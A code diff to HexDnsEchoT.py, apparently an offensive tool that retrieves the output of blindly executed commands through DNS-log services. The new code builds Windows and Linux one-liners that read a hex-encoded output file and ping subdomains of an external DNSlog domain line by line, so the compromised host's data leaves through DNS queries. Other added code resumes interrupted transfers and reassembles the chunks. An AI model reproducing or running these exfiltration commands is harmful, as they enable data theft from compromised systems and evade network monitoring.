@@ -8,6 +8,7 @@ import datetime
 import pytz
 import requests
 import re
+import operator
 from tzlocal import get_localzone
 from requests.auth import HTTPBasicAuth
 
@@ -30,7 +31,7 @@ def get_new_config():
     finishOnce = False
 
 def get_ds_config():
-    global time_zone,domain_server,count_counts,domain,dnsurl,token,command,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
+    global time_zone,domain_server,count_counts,domain,dnsurl,token,command,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce,judgeDealData,getResult,skipLinesRe,tokens,lastFinishTimes,getGR
     url = domain_server + '/new_gen'
     if args.httpbasicuser == None:
         dataResult = json.loads(requests.get(url,verify=False).text)
@@ -39,9 +40,11 @@ def get_ds_config():
     domain = dataResult['domain']
     dnsurl = domain
     token = dataResult['token']
+    tokens = token
     localTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) # get localtime
     lastFinishTime = timezone_change(localTime, src_timezone=str(get_localzone()), dst_timezone=time_zone) # record last finish time
-    print("\n获取本次命令执行结果:\npython3 HexDnsEchoT.py -ds " + domain_server + " -t " + token + " -lt \"" + lastFinishTime + "\" -m GR" + " -cc " + str(count_counts) + "\n")
+    lastFinishTimes = lastFinishTime
+    print("\n获取本次命令执行结果:\npython3 HexDnsEchoT.py -ds " + domain_server + " -t " + token + " -lt \"" + lastFinishTime + "\" -m GR -cc " + str(count_counts) + "\n")
     print(domain_server + '/' +token)
     # dig.pm's timezone is utc，need to change timezone
     print(lastFinishTime)
@@ -49,14 +52,51 @@ def get_ds_config():
     commandEndPos = 0
     lastRecordLen = 0
     finishOnce = False
+    getResult = False
+    getGR = True
+    judgeDealData = "N"
 
-def get_config():
-    global time_zone,domain_server,count_counts,dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
+def get_piece_config():
+    global domain,token,command,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce,getResult,skipLinesRe,tokens,lastFinishTimes
+    url = domain_server + '/new_gen'
+    if args.httpbasicuser == None:
+        dataResult = json.loads(requests.get(url,verify=False).text)
+    else:
+        dataResult = json.loads(requests.get(url,verify=False,auth=HTTPBasicAuth(args.httpbasicuser, args.httpbasicpass)).text)
+    domain = dataResult['domain']
+    token = dataResult['token']
+    tokens = tokens + "," + token
+    commandTemWin = r'for /f "skip=skipLines tokens=1-17" %a in (execfile7.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.execfile.{0}'
+    commandTemLinux = r'cat execfile7.txt | tail -n +skipLines |sed "s/[[:space:]]//g" | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.execfile.{0}; done'
+    commandWin = commandTemWin.format(domain)
+    commandLinux = commandTemLinux.format(domain)
+    execfilename = ''.join(re.findall(r'[A-Za-z]', command)) 
+    print("Windows:\n")
+    print(commandWin.replace('command',command).replace('execfile', execfilename).replace('skipLines',str(skipLinesRe)))
+    print("\nLinux:\n")
+    print(commandLinux.replace('command',command).replace('execfile', execfilename).replace('skipLines',str(skipLinesRe)))
+    localTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) # get localtime
+    lastFinishTime = timezone_change(localTime, src_timezone=str(get_localzone()), dst_timezone="Asia/Shanghai") # record last finish time
+    lastFinishTimes = lastFinishTimes + "," + lastFinishTime
+    print("\n获取本次命令执行结果:\npython3 HexDnsEchoT.py -ds " + domain_server +" -t " +  tokens + " -lt \"" + lastFinishTimes + "\" -m GR -cc " + str(count_counts) + "\n")
+    print(domain_server+'/'+token)
+    # dig.pm's timezone is utc，need to change timezone
     print(lastFinishTime)
     commandStartPos = 0
     commandEndPos = 0
     lastRecordLen = 0
+    getResult = False
+
+def get_config():
+    global time_zone,domain_server,count_counts,dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce,skipLinesRe,getResult,getGR,firstGR,judgeDealData
+    commandStartPos = 0
+    commandEndPos = 0
+    lastRecordLen = 0
+    judgeDealData = "N"
     finishOnce = False
+    firstGR = True
+    getGR = False
+    getResult = False
 
 
 def generate_command():
@@ -70,6 +110,24 @@ def generate_command():
     print("\nLinux:\n")
     print(commandLinux.replace('command',command).replace('execfile', execfilename))
 
+
+def get_line(data: list):
+    global skipLinesRe
+    hexCommand = { item[:4] : item[4:] for item in data }
+    linesNumber = [int(item[:3],base=16) for item in hexCommand]
+    linesNumber = sorted(linesNumber,key = lambda x:x)
+    lackLines = sorted(list(set(range(linesNumber[0], linesNumber[-1]+1)) - set(linesNumber)), reverse=True)
+    hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))
+    first = int(hexCommand[0][0][:3],base = 16)
+    last = int(hexCommand[-1][0][:3],base = 16)
+    if skipLinesRe >= first:
+        if len(lackLines) == 0:
+            skipLinesRe = last
+        else:
+            skipLinesRe = lackLines.pop()
+            print("\n发现中断，缺少第"+str(skipLinesRe)+"行的数据，下一次执行将从第"+str(skipLinesRe)+"行开始")
+    else:
+        print("\n发现中断，缺少第"+str(skipLinesRe)+"行至第"+str(first)+"行的数据，下一次执行将从第"+str(skipLinesRe)+"行开始")
 
 def generate_code(code_len=4):
     all_charts = '0123456789abcdefghijklmnopqrstuvwxyz'
@@ -139,12 +197,8 @@ def get_ds_dnslogdata() -> list:
 def deal_data(data: list):
     global finishOnce
     if commandStartPos and commandEndFlag:
-        for length in range(commandStartPos,-1,-1):
-            if result[length-1]['created_at'] < lastFinishTime:break
-            if result[length-1]['name'].count('.') == 5:
-                commandHex[commandName].append(result[length-1]['name'])
         try:
-            hexCommand = { item[:4] : item[4:] for item in commandHex[commandName] }
+            hexCommand = { item[:4] : item[4:] for item in data }
 
             hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))
             
@@ -176,14 +230,10 @@ def deal_data(data: list):
 
 # deal with DNSlog data, Format the output
 def deal_ds_data(data: list):
-    global finishOnce
+    global finishOnce,getGR
     if commandStartPos and commandEndFlag:
-        for length in range(commandStartPos,-1,-1):
-            if result[length-1][1]['time'] < lastFinishTime:break
-            if result[length-1][1]['subdomain'].count('.') == count_counts:
-                commandHex[commandName].append(result[length-1][1]['subdomain'])
         try:
-            hexCommand = { item[:4] : item[4:] for item in commandHex[commandName] } 
+            hexCommand = { item[:4] : item[4:] for item in data } 
             hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))
 
             hexCommand = [ item[1][:32] for item in hexCommand]
@@ -210,6 +260,7 @@ def deal_ds_data(data: list):
             print('Maybe use START to execute commands and cause DNSLog records to be lost..\nIt is recommended to remove START from the command')
         print('----Get Result End!----')
         finishOnce = True
+        getGR = True
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
@@ -272,9 +323,11 @@ if __name__ == "__main__":
                 sys.exit(0)
             count_counts = args.count
             count_counts = int(count_counts)
-            lastFinishTime = args.lastfinishtime
-            token = args.token
+            lastFinishTimes = args.lastfinishtime
+            tokens = args.token
             domain_server = args.domain_server
+            dataList = []
+            skipLinesRe = 0
             get_config()
         else:
             if args.timezone == None:
@@ -288,6 +341,8 @@ if __name__ == "__main__":
             count_counts = args.count
             count_counts = int(count_counts)
             time_zone = args.timezone
+            dataList = []
+            skipLinesRe = 0
             get_ds_config()
             generate_command()
 
@@ -303,9 +358,34 @@ if __name__ == "__main__":
                 command = input("请输入想要执行的命令:")
                 generate_command()
             else:
+                dataList = []
+                skipLinesRe = 0
                 command = input("请输入想要执行的命令：")
                 get_ds_config()
                 generate_command()
+
+        if not args.domain_server == None:
+            if getResult and getGR:
+                get_piece_config()
+            if not getGR and firstGR:
+                if operator.contains(tokens,","):
+                    tokensList = tokens.split(",")
+                    lastFinishTimesList = lastFinishTimes.split(",")
+                    tokenLen = len(tokensList)
+                    l = 0
+                    token = tokensList[l]
+                    lastFinishTime = lastFinishTimesList[l]
+                else:
+                    token = tokens
+                    lastFinishTime = lastFinishTimes
+            if not getGR and not firstGR:
+                if getResult:
+                    commandStartPos = 0
+                    commandEndPos = 0
+                    lastRecordLen = 0
+                    getResult = False
+                token = tokensList[l]
+                lastFinishTime = lastFinishTimesList[l]
 
         for i in range(requestTime,-1,-1):
             print('\r', 'Wait DNSLog data: {}s...'.format(str(i)), end='') 
@@ -317,9 +397,11 @@ if __name__ == "__main__":
                 url = domain_server + '/' +token
             #proxies = { 'http':'http://127.0.0.1:8080' }
             if args.httpbasicuser == None:
-                result = json.loads(requests.get(url, proxies=False, verify=False).text.lower())
+                responsestxt = requests.get(url, proxies=False, verify=False).text.lower()
+                result = json.loads(responsestxt)
             else:
-                result = json.loads(requests.get(url, proxies=False, verify=False,auth=HTTPBasicAuth(args.httpbasicuser, args.httpbasicpass)).text.lower())
+                responsestxt = requests.get(url, proxies=False, verify=False,auth=HTTPBasicAuth(args.httpbasicuser, args.httpbasicpass)).text.lower()
+                result = json.loads(responsestxt)
             if args.domain_server == None:
                 result = result['data']
                 if result == []:
@@ -376,5 +458,25 @@ if __name__ == "__main__":
                 commandEndFlag = 1
                 #print('Command DNSLog Record Finish...')   
 
-            dataList = get_ds_dnslogdata()
-            deal_ds_data(dataList)
+            # dataList = get_ds_dnslogdata()
+            dataDns = get_ds_dnslogdata()
+            if not dataDns == None:
+                dataList.extend(dataDns)
+                firstGR = False
+            
+            if not dataDns == None:
+                getResult = True
+                if operator.contains(responsestxt,"31313131") or operator.contains(responsestxt,"0a31"):
+                    get_line(dataList)
+                    judgeDealData = input("\n疑似为最后一块，请输入Y/N决定是否开始处理数据：").lower()
+                else:
+                    get_line(dataDns)
+                    # print("本次获取到的数据为"+len(result)+"行")
+                    print("\n未发现结束符号，继续执行")
+            
+            if judgeDealData == "y":
+                deal_ds_data(dataList)
+            else:
+                if not dataDns == None and not getGR:
+                    l = l + 1
+                    print(l)
